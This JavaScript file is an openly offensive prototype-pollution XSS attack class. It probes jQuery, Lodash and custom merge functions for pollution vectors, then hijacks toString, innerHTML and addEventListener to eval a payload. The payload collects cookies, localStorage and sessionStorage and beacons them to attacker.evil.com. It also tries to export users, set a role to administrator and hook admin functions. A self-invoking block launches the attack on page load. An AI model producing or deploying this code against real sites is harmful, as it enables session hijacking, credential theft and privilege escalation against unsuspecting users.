/**
 * Advanced DOM-based XSS exploiting prototype pollution
 * This attack modifies JavaScript prototypes to achieve code execution
 */
class PrototypePollutionXSS {
    constructor() {
        this.originalPrototypes = new Map();
        this.pollutionPayloads = [];
    }

    /**
     * Execute prototype pollution leading to XSS
     */
    executeAttack() {
        // Step 1: Identify pollution vectors
        this.findPollutionVectors();
        
        // Step 2: Execute prototype pollution
        this.pollutePrototypes();
        
        // Step 3: Trigger XSS through polluted prototypes
        this.triggerXSSExecution();
    }

    /**
     * Find common prototype pollution vectors in the application
     */
    findPollutionVectors() {
        // Common vulnerable patterns to exploit
        const vulnerablePatterns = [
            // jQuery-style extend functions
            () => this.testjQueryExtend(),
            
            // Lodash merge functions
            () => this.testLodashMerge(),
            
            // Custom object merge functions
            () => this.testCustomMerge(),
            
            // JSON parsing with __proto__
            () => this.testJSONProto(),
            
            // URL parameter parsing
            () => this.testURLParams()
        ];

        vulnerablePatterns.forEach(test => {
            try {
                test();
            } catch (e) {
                // Test failed, vector not available
            }
        });
    }

    /**
     * Test jQuery extend vulnerability
     */
    testjQueryExtend() {
        if (typeof $ !== 'undefined' && $.extend) {
            // Test if jQuery.extend is vulnerable to prototype pollution
            const testObj = {};
            const maliciousPayload = JSON.parse('{"__proto__": {"polluted": true}}');
            
            $.extend(true, testObj, maliciousPayload);
            
            // Check if pollution worked
            if (({}).polluted === true) {
                this.pollutionPayloads.push({
                    type: 'jquery',
                    executor: (payload) => $.extend(true, {}, payload)
                });
                
                // Clean up test pollution
                delete Object.prototype.polluted;
            }
        }
    }

    /**
     * Test Lodash merge vulnerability
     */
    testLodashMerge() {
        if (typeof _ !== 'undefined' && _.merge) {
            const testObj = {};
            const maliciousPayload = JSON.parse('{"__proto__": {"polluted": true}}');
            
            _.merge(testObj, maliciousPayload);
            
            if (({}).polluted === true) {
                this.pollutionPayloads.push({
                    type: 'lodash',
                    executor: (payload) => _.merge({}, payload)
                });
                
                delete Object.prototype.polluted;
            }
        }
    }

    /**
     * Test custom merge functions
     */
    testCustomMerge() {
        // Look for custom merge/extend functions in global scope
        const globalKeys = Object.keys(window);
        const mergePatterns = ['merge', 'extend', 'assign', 'deepMerge', 'deepExtend'];
        
        globalKeys.forEach(key => {
            const func = window[key];
            if (typeof func === 'function') {
                mergePatterns.forEach(pattern => {
                    if (key.toLowerCase().includes(pattern)) {
                        try {
                            // Test if function is vulnerable
                            const testPayload = JSON.parse('{"__proto__": {"polluted": true}}');
                            func({}, testPayload);
                            
                            if (({}).polluted === true) {
                                this.pollutionPayloads.push({
                                    type: 'custom',
                                    name: key,
                                    executor: (payload) => func({}, payload)
                                });
                                
                                delete Object.prototype.polluted;
                            }
                        } catch (e) {
                            // Function not vulnerable or incompatible
                        }
                    }
                });
            }
        });
    }

    /**
     * Test JSON parsing with __proto__
     */
    testJSONProto() {
        try {
            // Some applications use eval or unsafe JSON parsing
            const maliciousJSON = '{"__proto__": {"polluted": true}}';
            const parsed = JSON.parse(maliciousJSON);
            
            // Manually assign to test prototype pollution
            Object.assign({}, parsed);
            
            if (({}).polluted === true) {
                this.pollutionPayloads.push({
                    type: 'json',
                    executor: (payload) => Object.assign({}, JSON.parse(JSON.stringify(payload)))
                });
                
                delete Object.prototype.polluted;
            }
        } catch (e) {
            // Not vulnerable
        }
    }

    /**
     * Pollute prototypes with XSS payloads
     */
    pollutePrototypes() {
        if (this.pollutionPayloads.length === 0) return;

        // Store original prototypes for cleanup
        this.backupOriginalPrototypes();

        // XSS payloads to inject via prototype pollution
        const xssPayloads = {
            // Pollute toString method
            "__proto__": {
                "toString": function() {
                    // Execute XSS when toString is called
                    if (!this._xssExecuted) {
                        this._xssExecuted = true;
                        this.executeXSSPayload();
                    }
                    return "[object Object]";
                }.bind(this)
            }
        };

        const domPayloads = {
            "__proto__": {
                // Pollute innerHTML setter
                "innerHTML": {
                    set: function(value) {
                        // Intercept innerHTML assignments
                        if (typeof value === 'string' && value.includes('<')) {
                            // Inject XSS into any HTML content
                            value += '<img src=x onerror="(' + this.getXSSPayload() + ')()" style="display:none">';
                        }
                        // Call original innerHTML setter
                        Object.getOwnPropertyDescriptor(Element.prototype, 'innerHTML').set.call(this, value);
                    }.bind(this)
                }
            }
        };

        const eventPayloads = {
            "__proto__": {
                // Pollute addEventListener
                "addEventListener": function(type, listener, options) {
                    // Inject XSS into event listeners
                    const originalListener = listener;
                    const maliciousListener = function(event) {
                        // Execute XSS payload before original listener
                        try {
                            eval(this.getXSSPayload());
                        } catch (e) {
                            // Silently fail
                        }
                        
                        // Call original listener
                        if (typeof originalListener === 'function') {
                            return originalListener.call(this, event);
                        }
                    }.bind(this);
                    
                    // Call original addEventListener
                    EventTarget.prototype.addEventListener.call(this, type, maliciousListener, options);
                }.bind(this)
            }
        };

        // Execute pollution using available vectors
        this.pollutionPayloads.forEach(payload => {
            try {
                payload.executor(xssPayloads);
                payload.executor(domPayloads);
                payload.executor(eventPayloads);
            } catch (e) {
                // Pollution failed, try next vector
            }
        });
    }

    /**
     * Backup original prototypes for potential cleanup
     */
    backupOriginalPrototypes() {
        const prototypesToBackup = [
            Object.prototype,
            Array.prototype,
            String.prototype,
            Element.prototype,
            EventTarget.prototype
        ];

        prototypesToBackup.forEach(proto => {
            const backup = {};
            Object.getOwnPropertyNames(proto).forEach(prop => {
                const descriptor = Object.getOwnPropertyDescriptor(proto, prop);
                if (descriptor) {
                    backup[prop] = descriptor;
                }
            });
            this.originalPrototypes.set(proto, backup);
        });
    }

    /**
     * Trigger XSS execution through various DOM interactions
     */
    triggerXSSExecution() {
        // Trigger methods that commonly call toString
        const triggerMethods = [
            () => String({}), // Explicit string conversion
            () => "" + {}, // Implicit string conversion
            () => JSON.stringify({}), // JSON serialization
            () => console.log({}), // Console output
            () => document.title = {}, // DOM assignment
            () => localStorage.setItem('test', {}), // Storage operations
        ];

        triggerMethods.forEach(trigger => {
            try {
                trigger();
            } catch (e) {
                // Trigger failed, continue with others
            }
        });

        // Trigger DOM manipulation that might use polluted prototypes
        this.triggerDOMManipulation();
        
        // Trigger event listeners that might be polluted
        this.triggerEventListeners();
    }

    /**
     * Trigger DOM manipulation to activate polluted innerHTML
     */
    triggerDOMManipulation() {
        // Create elements and manipulate them to trigger pollution
        const testDiv = document.createElement('div');
        document.body.appendChild(testDiv);
        
        // These operations might trigger polluted prototypes
        testDiv.innerHTML = '<span>test content</span>';
        testDiv.outerHTML = '<div>replacement content</div>';
        
        // Clean up
        if (testDiv.parentNode) {
            testDiv.parentNode.removeChild(testDiv);
        }
    }

    /**
     * Trigger event listeners to activate polluted addEventListener
     */
    triggerEventListeners() {
        const testElement = document.createElement('button');
        document.body.appendChild(testElement);
        
        // Add event listener - this might trigger polluted prototype
        testElement.addEventListener('click', function() {
            // This listener might be intercepted by pollution
        });
        
        // Trigger the event
        testElement.click();
        
        // Clean up
        document.body.removeChild(testElement);
    }

    /**
     * Get the main XSS payload code
     */
    getXSSPayload() {
        return `
            // Advanced XSS payload executed via prototype pollution
            (function() {
                // Steal authentication data
                const authData = {
                    cookies: document.cookie,
                    localStorage: JSON.stringify(localStorage),
                    sessionStorage: JSON.stringify(sessionStorage),
                    url: location.href,
                    timestamp: Date.now()
                };
                
                // Exfiltrate data
                const img = new Image();
                img.src = 'https://attacker.evil.com/collect?data=' + 
                          encodeURIComponent(btoa(JSON.stringify(authData)));
                
                // Execute additional malicious actions
                try {
                    // Attempt to access admin functions
                    if (window.adminPanel) {
                        window.adminPanel.executeCommand('export_users');
                    }
                    
                    // Attempt to modify critical data
                    if (window.userProfile) {
                        window.userProfile.role = 'administrator';
                    }
                    
                    // Hook into any admin functions
                    Object.keys(window).forEach(key => {
                        if (key.toLowerCase().includes('admin') && typeof window[key] === 'function') {
                            const originalFunc = window[key];
                            window[key] = function(...args) {
                                // Log admin function calls
                                console.log('Admin function called:', key, args);
                                return originalFunc.apply(this, args);
                            };
                        }
                    });
                    
                } catch (e) {
                    // Silently handle errors
                }
            })();
        `;
    }

    /**
     * Execute the XSS payload directly
     */
    executeXSSPayload() {
        try {
            eval(this.getXSSPayload());
        } catch (e) {
            // Silently handle execution errors
            const img = new Image();
            img.src = 'https://attacker.evil.com/error?msg=' + encodeURIComponent(e.toString());
        }
    }
}

/**
 * Execute prototype pollution XSS attack
 * This would be triggered from a DOM-based XSS vector
 */
(function() {
    // Wait for DOM to be ready
    if (document.readyState === 'loading') {
        document.addEventListener('DOMContentLoaded', function() {
            const attack = new PrototypePollutionXSS();
            attack.executeAttack();
        });
    } else {
        const attack = new PrototypePollutionXSS();
        attack.executeAttack();
    }
})();
